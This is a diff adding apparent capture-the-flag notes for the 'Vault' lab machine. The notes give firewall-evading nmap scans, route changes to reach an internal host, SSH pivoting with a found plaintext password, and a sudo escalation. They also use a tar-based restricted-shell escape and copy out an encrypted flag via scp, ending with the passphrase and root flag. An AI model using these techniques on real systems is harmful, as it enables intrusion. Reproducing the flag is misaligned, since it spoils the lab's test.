@@ -1,0 +1,87 @@
+#10.10.10.109
+--------------
+-------------------------------------------------------
+#INSIDE 'root@DNS' SHELL(non-terminal)
+-------------------------------------------------------
+#found new credential for dave user inside /home/dave/ssh
+#USER= dave		(cred for 'dave@DNS')
+#PASSWD= dav3gerous567
+
+#found 'Vault' machine ip inside '/etc/hosts'
+#Vault ip =  192.168.5.2
+
+#check log files
+#analyse /var/log/auth.log
+#command found
+#check open ports on vault
+/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
+#port= 987 open  (ssh for 192.168.5.2)
+
+#ping for 192.168.5.2 doesn't work 
+#so add ip address
+sudo ip addr add 192.168.5.197/24 dev ens3
+#
+sudo route del -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
+
+#exit from 'root@DNS'
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+------------------------------------------------------
+#AGAIN INSIDE 'dave@ubuntu' SHELL
+------------------------------------------------------
+#now connect to 'dave@DNS' via ssh from 'dave@ubuntu'
+ssh dave@192.168.122.4
+#PASSWD= dav3gerous567
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+------------------------------------------------------
+#INSIDE 'dave@DNS' SHELL
+------------------------------------------------------
+#check privilages
+sudo -l
+#dave has full access
+sudo su
+
+#connect to Vault (192.168.5.2) machine
+ssh dave@192.168.5.2 -p 987
+#PASSWD= dav3gerous567
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+------------------------------------------------------
+#INSIDE 'dave@vault' SHELL
+------------------------------------------------------
+#found root.txt.gdb 
+#get out of rbash
+tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
+#set PATH variable
+export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+#file is not decrypting 
+#it requires the secret key, that is in 'dave@ubuntu'
+#transfer file from 'dave@vault' --> 'dave@DNS' --> 'dave@ubuntu'
+#exit from 'dave@vault'
+--------------------------------
+#inside 'dave@DNS'
+#copy file into 'dave@DNS'
+scp -P 987 dave@192.168.5.2:/home/dave/root.txt.gpg /home/dave/
+#exit from 'dave@DNS'
+--------------------------------
+#inside 'dave@ubuntu'
+#copy file into 'dave@ubuntu'
+scp dave@192.168.122.4:/home/dave/root.txt.gpg /home/dave/
+
+#decrypt file
+gpg -d root.txt.gpg
+#PASSPHRASE= itscominghome   (inside 'key' file)
+
+#key
+ca468370b91d1f5906e31093d9bfe819
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
